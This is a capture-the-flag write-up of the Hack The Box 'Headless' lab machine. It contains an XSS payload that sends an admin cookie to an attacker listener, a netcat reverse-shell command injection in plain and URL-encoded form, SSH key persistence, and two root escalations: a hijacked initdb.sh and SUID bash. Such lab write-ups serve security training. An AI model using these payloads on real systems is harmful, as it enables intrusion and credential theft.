---
cover: >-
  https://labs.hackthebox.com/storage/avatars/26e076db204a74b99390e586d7ebcf8c.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Headless

## 1. Machine General Information

* **Operative System:** Linux
* **Difficulty**: Easy
* **Keywords**:
  * SUID
  * Linux

## 2. Enumeration

### 2.1 Port Scanning

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 16:05 EDT
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 4.53 seconds
```

Using curl we can see that a python web server (Flask probably) is running on port 5000:

```
$ curl http://headless.htb:5000/ -I
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Thu, 28 Mar 2024 20:19:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2799
Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
Connection: close
```

Notice that the response header has a Set-Cookie which is setting up a cookie called `is_admin=...`.

### 2.2 Web Server Enumeration

Using gobuster to enumerate directories or files from the web server:

```
$ gobuster dir -u http://headless.htb:5000/ -w /usr/share/wordlists/dirb/big.txt -t 30 --timeout 30s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://headless.htb:5000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 30s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 500) [Size: 265]
/support              (Status: 200) [Size: 2363]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Trying to access `/dashboard` with curl gives the next result:

```
$ curl -X GET  http://admin:admin@10.10.11.8:5000/dashboard -b "is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs"
<!doctype html>
<html lang=en>
<title>401 Unauthorized</title>
<h1>Unauthorized</h1>
<p>The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn&#39;t understand how to supply the credentials required.</p>
```

Accessing the web server main path  `/`we see the following:

<figure><img src="../../../../../.gitbook/assets/imagen (13).png" alt=""><figcaption><p>Headless.htb main page</p></figcaption></figure>

If we click on the "For questions" button we'll be redirected to `/support` page.&#x20;

<figure><img src="../../../../../.gitbook/assets/imagen (14).png" alt=""><figcaption><p>Headless.htb /support page</p></figcaption></figure>

If we fill the form and then click on Submit button, nothing happens, but if we send a simple XSS test in the Message field, the next message is displayed:

<figure><img src="../../../../../.gitbook/assets/imagen (15).png" alt=""><figcaption><p>Headless.htb Hacking Attempt message</p></figcaption></figure>

Sending a XSS payload in the request header gives the next result:

<figure><img src="../../../../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>

So is vulnerable to XSS and reading carefully the hacking attempt message, we can see that this request header is sent to the administrator so let's try sending a gift to the administrators.

## 3. Exploitation&#x20;

### 3.1 Stealing the Admin Cookie

First we need to intercept the same POST request made by `/support` form with BurpSuite and then add a new custom Header called Payload.

```
POST /support HTTP/1.1
Host: headless.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://headless.htb:5000/support
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://headless.htb:5000
Connection: close
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
Payload: <script> new Image().src = "http://10.10.14.3:6969/" + document.cookie; </script>

fname=Johan&lname=Johan&email=n%40n&phone=123&message=%3Cscrip%3E
```

This payload is going to exfiltrate the administrator cookie sending a GET request to our listener so after sending the above request we should start a listener with `nc`:

```
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.8] 38612
GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1
Host: 10.10.14.3:6969
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5000/
Connection: keep-alive
```

Now we have the administrator cookie and we can access `/dashboard` page.&#x20;

```
$ curl -X GET -I http://admin:admin@10.10.11.8:5000/dashboard -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Thu, 28 Mar 2024 20:54:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2000
Connection: close
```

### 3.2 Obtaining access

<figure><img src="../../../../../.gitbook/assets/imagen.png" alt=""><figcaption><p>Headless.htb /dashboard page</p></figcaption></figure>

In the `/dashboard` page the only thing we can do is generate a report. Inspecting the request with BurpSuite we can see that a post parameter is sent to the dashboard:

```
POST /dashboard HTTP/1.1
Host: headless.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://headless.htb:5000
Connection: close
Referer: http://headless.htb:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-15
```

This parameter is vulnerable to remote code execution. Using the next parameter we can get a reverse shell:

Plain Text: `;nc -e /bin/bash 10.10.14.3 6969;`

URL Encoded: `%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%3b`

Before sending the post request we should start a listener with netcat:

```
# starting listener
$ nc -lvnp 6969
listening on [any] 6969 ...

# POST request
POST /dashboard HTTP/1.1
Host: headless.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://headless.htb:5000
Connection: close
Referer: http://headless.htb:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%3b

# receiving reverse shellc
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.8] 42196
whoami
dvir
```

Now we can add our public key to `/home/dvir/.ssh/autorized_keys` and log in using SSH to get an interactive SHELL.

```
# our terminal
cat ~/.ssh/key.pub
....KEY-STRING....

# dvir reverse shell
echo "....KEY-STRING...." >> /home/dvir/.ssh/authorized_keys

# our terminal
ssh dvir@headless.htb
Linux headless 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
-bash-5.2$ cat /home/dvir/user.txt
SECRETSECRETSECRETSECRET
```

## 4. Privilege Escalation

### 4.1 Privilege Escalation Method 1

Executing the command `sudo -l` we can see that we have permission to execute `/usr/bin/syscheck` as root.

{% code title="/usr/bin/syscheck" lineNumbers="true" %}
```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
{% endcode %}

Analyzing this script, we can see that at line 19 it executes a script called initdb.sh in the current working directory so the next step is really simple.

We need to create a script called `initdb.sh` inside a writable directory with the next content:

{% code title="./initdb.sh" lineNumbers="true" %}
```bash
#!/usr/bin/bash
nc -e /bin/bash 10.10.14.3 6969
```
{% endcode %}

Once the script is created and execution right is set (`chmod +x initdb.sh`) we should start a listener in our machine with `nc` and execute `/usr/bin/syscheck` in headless.htb.

```
# our machine terminal
$ nc -lvnp 6969
listening on [any] 6969 ...

# SSH dvir terminal
-bash-5.2$ sudo /usr/bin/syscheck 
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.4G
System load average:  0.59, 0.79, 0.65
Database service is not running. Starting it...

# our machine terminal
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.8] 39834
whoami 
root
cat /root/root.txt
SECRETSECRETSECRETSECRET
```

### 4.2 Privilege Escalation Method 2

Executing a simple SUID enumeration  we can see that `/usr/bin/bash` is a SUID binary so we can execute the next command to get a root shell.

```
-bash-5.2$ find / -perm /4000 2>/dev/null
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/mount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/bash
/usr/bin/umount
/usr/bin/ntfs-3g
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
-bash-5.2$ /usr/bin/bash -p
bash-5.2# whoami
root
```

## 5. References

* SUID bash ([https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid))
